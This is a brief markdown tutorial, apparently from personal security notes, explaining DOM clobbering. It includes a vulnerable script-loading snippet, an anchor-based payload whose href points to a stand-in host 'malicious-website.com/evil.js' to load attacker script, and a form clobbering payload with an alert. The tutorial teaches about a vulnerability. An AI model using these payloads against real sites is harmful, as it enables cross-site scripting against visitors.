# DOM clobbering

DOM clobbering is a web security vulnerability that occurs when an attacker manipulates a webpage's Document Object Model (DOM) by injecting malicious data into the global scope of a web page, effectively overwriting or "clobbering" important JavaScript variables and objects. This can lead to unexpected behavior or the execution of unintended code, potentially enabling various types of attacks, including cross-site scripting (XSS). To mitigate DOM clobbering, developers should carefully control the scope of their variables and avoid exposing sensitive data to the global scope.

## Exploit

```js
var someObject = window.someObject || {};
```

If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:

```js
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

### Double a technique

To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.

To resume:

if u want to modifie the value of a `window.something.var`, you need to inject double `<a id=something><a id=something>` with the same id, and the second `<a>` should have the attribute `name=var` and `href=var_value`. So next time `window.something.var` is call, it return : `{var: "var_value"}`.

### Form technique

Another common technique is to use a form element along with an element such as input to clobber DOM properties.

```html
<form onclick=alert(1)><input id=attributes>Click me
```

---

[**:arrow_right_hook: Back home**](/README.md)